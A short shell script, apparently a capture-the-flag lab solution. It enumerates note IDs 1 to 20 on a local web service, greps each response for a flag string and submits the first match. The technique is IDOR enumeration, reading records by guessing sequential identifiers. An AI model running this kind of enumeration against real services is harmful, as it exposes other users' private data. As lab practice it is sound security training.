for i in $(seq 1 20); do
	f=$(curl -s "http://127.0.0.1:8081/notes?id=$i" | grep -o 'flag{[^}]*}')
	[ -n "$f" ] && { lab submit "$f"; exit; }
done
